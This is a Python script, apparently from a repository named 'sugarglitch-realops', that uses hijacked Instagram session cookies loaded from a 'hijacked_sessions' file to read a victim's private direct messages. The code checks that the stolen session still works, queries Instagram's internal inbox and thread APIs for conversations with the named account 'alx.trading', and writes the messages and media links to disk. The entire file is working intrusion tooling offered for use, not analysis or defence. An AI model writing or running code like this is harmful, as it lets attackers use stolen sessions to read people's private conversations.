# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
🎯 REAL DM EXTRACTOR - Using Fresh Hijacked Sessions
Extract real Instagram DMs using valid session cookies
"""

import json
import requests
import time
from datetime import datetime
import os
from pathlib import Path

class FreshDMExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.session_file = "/workspaces/sugarglitch-realops/hijacked_sessions/fresh_hijacked_session_1749169370.json"
        self.output_dir = "/workspaces/sugarglitch-realops/data/real_fresh_extraction"

        os.makedirs(self.output_dir, exist_ok=True)

        print("🎯 REAL DM EXTRACTOR - Using Fresh Hijacked Sessions")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Session file: {self.session_file}")

    def load_session(self):
        """Load fresh hijacked session"""
        try:
            with open(self.session_file, 'r') as f:
                session_data = json.load(f)

            # Extract cookies
            cookies = {}
            for cookie in session_data.get('cookies', []):
                cookies[cookie['name']] = cookie['value']

            print(f"✅ Loaded {len(cookies)} cookies")
            print(f"Available cookies: {list(cookies.keys())}")

            return cookies
        except Exception as e:
            print(f"❌ Error loading session: {e}")
            return None

    def test_session_validity(self, cookies):
        """Test if session is valid"""
        print("\n🧪 Testing session validity...")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }

        session = requests.Session()
        session.cookies.update(cookies)
        session.headers.update(headers)

        # Test basic Instagram access
        try:
            response = session.get('https://www.instagram.com/', timeout=10)
            print(f"Instagram main page: {response.status_code}")

            if response.status_code == 200:
                if 'login' in response.url.lower():
                    print("❌ Session expired - redirected to login")
                    return False
                else:
                    print("✅ Session appears valid")
                    return True
            else:
                print(f"❌ Bad status code: {response.status_code}")
                return False

        except Exception as e:
            print(f"❌ Session test failed: {e}")
            return False

    def extract_direct_messages(self, cookies):
        """Extract direct messages using Instagram's internal API"""
        print("\n📥 Extracting direct messages...")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': cookies.get('csrftoken', ''),
            'X-Instagram-AJAX': '1',
            'Connection': 'keep-alive',
            'Referer': 'https://www.instagram.com/direct/inbox/',
        }

        session = requests.Session()
        session.cookies.update(cookies)
        session.headers.update(headers)

        # Try to get inbox
        try:
            print("🔍 Fetching inbox...")
            inbox_url = 'https://www.instagram.com/api/v1/direct_v2/inbox/'
            response = session.get(inbox_url, timeout=15)

            print(f"Inbox API response: {response.status_code}")

            if response.status_code == 200:
                inbox_data = response.json()
                print(f"✅ Got inbox data: {len(inbox_data.get('inbox', {}).get('threads', []))} threads")

                # Look for our target
                threads = inbox_data.get('inbox', {}).get('threads', [])
                target_thread = None

                for thread in threads:
                    users = thread.get('users', [])
                    for user in users:
                        if user.get('username') == self.target:
                            target_thread = thread
                            print(f"🎯 Found target thread: {thread.get('thread_id')}")
                            break
                    if target_thread:
                        break

                if target_thread:
                    return self.extract_thread_messages(session, target_thread)
                else:
                    print(f"❌ No thread found with {self.target}")
                    return None

            else:
                print(f"❌ Failed to get inbox: {response.status_code}")
                print(f"Response: {response.text[:200]}")
                return None

        except Exception as e:
            print(f"❌ Error extracting DMs: {e}")
            return None

    def extract_thread_messages(self, session, thread):
        """Extract messages from a specific thread"""
        print(f"\n💬 Extracting messages from thread...")

        thread_id = thread.get('thread_id')

        # Get thread messages
        try:
            messages_url = f'https://www.instagram.com/api/v1/direct_v2/threads/{thread_id}/'
            response = session.get(messages_url, timeout=15)

            print(f"Thread API response: {response.status_code}")

            if response.status_code == 200:
                thread_data = response.json()
                messages = thread_data.get('thread', {}).get('items', [])

                print(f"✅ Found {len(messages)} messages")

                # Process messages
                extracted_messages = []
                for msg in messages:
                    message_data = {
                        'id': msg.get('item_id'),
                        'timestamp': msg.get('timestamp'),
                        'user_id': msg.get('user_id'),
                        'text': msg.get('text', ''),
                        'item_type': msg.get('item_type'),
                    }

                    # Add media if present
                    if 'media' in msg:
                        media = msg['media']
                        message_data['media'] = {
                            'type': media.get('media_type'),
                            'url': media.get('image_versions2', {}).get('candidates', [{}])[0].get('url', ''),
                        }

                    extracted_messages.append(message_data)

                return {
                    'thread_id': thread_id,
                    'target': self.target,
                    'messages': extracted_messages,
                    'total_messages': len(extracted_messages),
                    'extraction_timestamp': datetime.now().isoformat()
                }
            else:
                print(f"❌ Failed to get thread messages: {response.status_code}")
                return None

        except Exception as e:
            print(f"❌ Error extracting thread messages: {e}")
            return None

    def save_results(self, data):
        """Save extraction results"""
        if not data:
            print("❌ No data to save")
            return

        timestamp = int(time.time())
        output_file = f"{self.output_dir}/real_dm_extraction_{timestamp}.json"

        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

            print(f"✅ Results saved to: {output_file}")
            print(f"📊 Total messages extracted: {data.get('total_messages', 0)}")

        except Exception as e:
            print(f"❌ Error saving results: {e}")

    def run(self):
        """Main extraction process"""
        print("\n🚀 Starting real DM extraction...")

        # Load session
        cookies = self.load_session()
        if not cookies:
            return

        # Test session
        if not self.test_session_validity(cookies):
            print("❌ Session is not valid, cannot proceed")
            return

        # Extract DMs
        results = self.extract_direct_messages(cookies)

        # Save results
        self.save_results(results)

        print("\n✅ Extraction completed!")

if __name__ == "__main__":
    extractor = FreshDMExtractor()
    extractor.run()
